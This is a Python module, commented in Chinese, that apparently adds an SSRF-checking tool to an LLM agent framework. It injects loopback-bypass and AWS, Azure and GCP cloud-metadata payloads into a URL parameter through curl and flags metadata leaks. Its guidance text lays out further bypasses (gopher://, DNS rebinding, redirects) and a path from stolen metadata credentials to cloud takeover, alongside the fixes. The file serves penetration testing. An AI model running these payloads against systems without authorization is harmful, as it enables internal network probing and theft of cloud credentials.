"""SSRF 检测：对 FUZZ 占位注入回环/云元数据 payload，判定 SSRF 与元数据泄露。

白帽定位：URL 类参数（url/img/callback/webhook）未限制目标 → SSRF。
回环绕过（127.0.0.1/十进制/八进制/IPv6/[::1]/0.0.0.0）扫内网，
169.254.169.254 云元数据接口命中 = 严重（凭据泄露前奏）。
"""

from __future__ import annotations

import re
from typing import Any

from .base import ToolProfile, check_installed

_URL_RE = re.compile(r"^https?://[^\s;|`$\\<>{}]{1,500}$", re.IGNORECASE)
_PAYLOAD_RE = re.compile(r"^[A-Za-z0-9%./:_\[\]\-]{1,200}$")

_DEFAULT_PAYLOADS: list[str] = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://0.0.0.0/",
    "http://[::1]/",
    "http://2130706433/",        # 127.0.0.1 十进制
    "http://0177.0.0.1/",        # 八进制
    "http://169.254.169.254/latest/meta-data/",   # AWS 元数据
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
    "http://metadata.google.internal/computeMetadata/v1/",  # GCP
]
_META_RE = re.compile(
    r"ami-id|security-credentials|accountid|instance-id|user-data|"
    r"instanceidentity|computeMetadata", re.IGNORECASE)
_MAX_PAYLOADS = 20

SCHEMAS: list[dict[str, Any]] = [
    {
        "type": "function",
        "function": {
            "name": "ssrf_check",
            "description": (
                "SSRF 验证：对 FUZZ 占位注入回环绕过（127.0.0.1/十进制/八进制/IPv6）"
                "与云元数据 payload（AWS/Azure/GCP），元数据特征命中=严重泄露，"
                "响应与基线差异=疑似内网可达。"
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "url": {
                        "type": "string",
                        "description": "含 FUZZ 占位的 URL，如 "
                                       "http://t.com/fetch?url=FUZZ",
                    },
                    "payloads": {
                        "type": "array",
                        "description": "自定义 payload 列表（可选，追加到内置 9 种）",
                        "items": {"type": "string"},
                    },
                },
                "required": ["url"],
            },
        },
    },
]


def _build_cmd(url: str) -> str:
    return f"curl -s -m 15 '{url}'"


def _is_meta_hit(raw: str) -> bool:
    return bool(_META_RE.search(raw))


def _summarize(baseline: str, results: list[tuple[str, str]]) -> str:
    meta = [(p, raw) for p, raw in results if _is_meta_hit(raw)]
    diff = [
        (p, raw) for p, raw in results
        if raw != baseline and len(raw) > 300 and p not in [m[0] for m in meta]
    ]
    head: list[str] = []
    if meta:
        head.append(f"🚨 云元数据泄露命中 ({len(meta)}):")
        for p, raw in meta:
            snippet = next(
                (l for l in raw.splitlines() if l.strip()), raw[:80])[:80]
            head.append(f"  payload: {p}")
            head.append(f"    回显: {snippet}…")
        head.append("下一步：元数据含临时凭据（AWS security-credentials）→ 直接接管云资源"
                    "（仅限授权）；修复：URL 协议/内网 IP 白名单 + DNS 重绑定防护。")
    elif diff:
        head.append(f"⚠️ 疑似 SSRF（{len(diff)} 个 payload 响应异常，与基线不同）:")
        for p, raw in diff[:5]:
            head.append(f"  {p} → {len(raw)} 字节（基线 {len(baseline)} 字节）")
        head.append("下一步：手工确认响应内容（内网应用默认页/错误差异），试内网 IP 段扩展；"
                    "云元数据 payload 命中即升级为严重。")
    else:
        head.append("✅ 未发现 SSRF 迹象——9 种 payload 响应均与基线一致（可能已过滤协议/域名）。")
        head.append("提示：试重定向链（http://redirect-service/→内网）、DNS 重绑定、"
                    "gopher://（redis 类内网协议）。")
    return ToolProfile._summary("", head, tail=25)


class SsrfCheckProfile(ToolProfile):
    name = "ssrf_check"
    aliases = ["ssrf 检测", "服务端请求伪造", "ssrf", "元数据泄露", "云元数据", "内网探测"]
    summary = "SSRF 检测（回环绕过 + 云元数据）"
    lore = """### SSRF 检测使用要点
- 定位：url/img/callback/webhook 类参数未限制目标 → SSRF。
  FUZZ 占位写法：ssrf_check(url='http://t.com/fetch?url=FUZZ')。
- 9 种 payload：回环（127.0.0.1/localhost/0.0.0.0/[::1]）、整数/八进制绕过
  （2130706433/0177.0.0.1）、云元数据（AWS 169.254.169.254/Azure/GCP）。
- 判定：元数据特征（ami-id/security-credentials/instance-id）= 严重泄露；
  响应与基线差异且非错误页 = 疑似内网可达（需手工确认）。
- 绕过进阶：重定向链、DNS 重绑定（解析到内网）、gopher://（redis/SMTP 内网
  协议）、@ 语法（http://user@127.0.0.1）。
- 结合流程：SSRF 确认 → 扫内网端口/读元数据拿云凭据 → 云控制台接管
  （仅限授权场景）；修复：协议白名单 + 内网 IP 拒绝 + 禁 DNS 重绑定。
- 注意：云元数据 v2（IMDSv2）需 PUT token，payload 可加
  X-aws-ec2-metadata-token 头场景需手工处理。"""
    extra_schemas = SCHEMAS

    async def exec_ssrf_check(self, ex: Any, args: dict[str, Any]) -> str:
        if not check_installed("curl"):
            return "curl 未安装（apt install curl）。"
        url = str(args.get("url") or "").strip()
        if not _URL_RE.match(url):
            return f"url 格式非法: {url!r}"
        if url.count("FUZZ") != 1:
            return "url 必须且只能包含一个 FUZZ 占位（如 http://t.com/fetch?url=FUZZ）。"
        payloads = list(_DEFAULT_PAYLOADS)
        extra = args.get("payloads") or []
        if not isinstance(extra, list):
            raise ValueError("payloads 必须是列表")
        for p in extra:
            p = str(p).strip()
            if not _PAYLOAD_RE.match(p):
                raise ValueError(f"payload 含非法字符: {p!r}")
            if p not in payloads:
                payloads.append(p)
        if len(payloads) > _MAX_PAYLOADS:
            raise ValueError(f"payload 总数不能超过 {_MAX_PAYLOADS}")
        baseline = await self._run(
            ex, _build_cmd(url.replace("FUZZ", "x")), timeout=20)
        results: list[tuple[str, str]] = []
        for p in payloads:
            raw = await self._run(ex, _build_cmd(url.replace("FUZZ", p)), timeout=20)
            results.append((p, raw))
        return _summarize(baseline, results)
